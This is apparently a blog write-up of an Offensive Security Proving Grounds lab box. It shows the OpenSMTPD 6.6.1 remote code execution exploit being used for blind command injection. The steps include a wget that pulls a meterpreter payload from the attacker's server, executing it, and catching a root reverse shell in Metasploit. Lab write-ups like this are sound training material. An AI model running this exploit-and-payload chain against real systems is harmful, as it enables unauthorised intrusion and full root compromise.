---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

---

# enumeration

Starting with a `nmap` scan to identify the attack surface of the target.

## nmap
```bash
$ nmap -Pn -p22,25,80,445 -sV 192.168.152.71
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 16:11 EST
Nmap scan report for 192.168.152.71
Host is up (0.10s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp        OpenSMTPD
80/tcp  open  http        nginx 1.14.0 (Ubuntu)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
```

---

# exploitation

`OpenSMTPD` looks like it is worth a look.

## search for an exploit
```bash
$ searchsploit opensmtpd                                                           
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                                                                                                                  | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                                                                                                                              | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                                                                                                                              | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                                                                                                                                                   | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                                                                                                                                     | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                                                                                                  | openbsd/remote/48140.c
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

> `OpenSMTPD 6.6.1 - Remote Code Execution`: `linux/remote/47984.py` looks promising.
{: .prompt-info }

```bash
$ python3 47984.py 192.168.228.71 25 'whoami'                                 
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```
> It seems to be a blind command injection as we do not get any text response to our command.
{: .prompt-info }

---

# post exploitation

We start by getting a reverse shell.  
When trying to get the reverse shell it was not possible to trigger a simple `bash` shell, so uploading a `meterpreter` executable and executing it made the trick here. 

## download `meterpreter` to target
### generate a `meterpreter` binary
```bash
$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.49.228 LPORT=445 -f elf > shell.elf 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1037680 bytes
Final size of elf file: 1037680 bytes
```

### start web server on attacker machine
```bash
$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### download meterpreter to target
```bash
$ python3 47984.py 192.168.228.71 25 'wget 192.168.49.228/shell.elf -O /tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```bash
$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.228.71 - - [31/Jan/2022 00:33:11] "GET /shell.elf HTTP/1.1" 200 -
```

> The download seemed to work!
{: .prompt-info }

## set permissions and execute `meterpreter`
### set permissions
```bash
$ python3 47984.py 192.168.228.71 25 'chmod +x /tmp/shell'                       
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

### start metasploit listener
```bash
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.228   yes       The listen address (an interface may be specified)
   LPORT  445              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.228:445
```

### execute payload
```bash
$ python3 47984.py 192.168.228.71 25 '/tmp/shell'                                 
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```bash
$ msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.228:445 
[*] Meterpreter session 1 opened (192.168.49.228:445 -> 192.168.228.71:49062 ) at 2022-01-31 00:33:24 -0500

meterpreter > getuid
Server username: root
```

> And we got a root shell :-)
{: .prompt-info }

---

# get the flag
```bash
meterpreter > shell
Process 1665 created.
Channel 1 created.
whoami
root
ls
proof.txt
cat proof.txt
e******************************a
```

Pwned! <@:-)
